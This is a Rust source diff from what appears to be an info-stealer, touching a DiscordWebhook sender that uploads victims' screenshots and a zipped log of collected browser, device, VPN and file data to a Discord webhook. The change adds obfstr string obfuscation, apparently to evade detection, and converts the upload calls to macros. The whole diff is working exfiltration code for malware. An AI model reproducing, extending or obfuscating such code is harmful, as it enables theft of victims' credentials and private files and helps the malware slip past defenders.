@@ -5,7 +5,8 @@ use alloc::{format, vec};
 use collector::{Browser, Collector, Device, FileGrabber, Software, Vpn};
 use derive_new::new;
 use indoc::formatdoc;
-use requests::{BodyRequestBuilder, MultipartBuilder, Request, RequestBuilder};
+use obfstr::obfstr as s;
+use requests::{write_file_field, write_text_field, BodyRequestBuilder, MultipartBuilder, Request, RequestBuilder};
 use utils::format_size;
 
 #[derive(Clone, new)]
@@ -105,7 +106,7 @@ impl DiscordWebhook {
         let body = builder.finish();
 
         Request::post(self.webhook.to_string())
-            .header("Content-Type", &content_type)
+            .header(s!("Content-Type"), &content_type)
             .body(body)
             .build()
             .send()
@@ -130,8 +131,8 @@ impl LogSender for DiscordWebhook {
 
         if let Some(screenshot) = collector.get_device().get_screenshot() {
             let mut builder = MultipartBuilder::new("----Multipart");
-            builder.write_file_field("file", "screenshot.png", "image/png", &screenshot);
-            builder.write_text_field("payload_json", r#"{"content": ""}"#);
+            write_file_field!(builder, "file", "screenshot.png", "image/png", &screenshot);
+            write_text_field!(builder, "payload_json", r#"{"content": ""}"#);
             self.send_multipart(builder)?;
         }
 
@@ -147,10 +148,10 @@ impl LogSender for DiscordWebhook {
 
         let mut builder = MultipartBuilder::new("----Multipart");
         if let LogFile::ZipArchive(archive) = log_file {
-            builder.write_file_field("file", "log.zip", "application/zip", &archive);
+            write_file_field!(builder, "file", "log.zip", "application/zip", &archive);
         }
 
-        builder.write_text_field("payload_json", &payload);
+        write_text_field!(builder, "payload_json" => &payload);
         self.send_multipart(builder)?;
 
         Ok(())
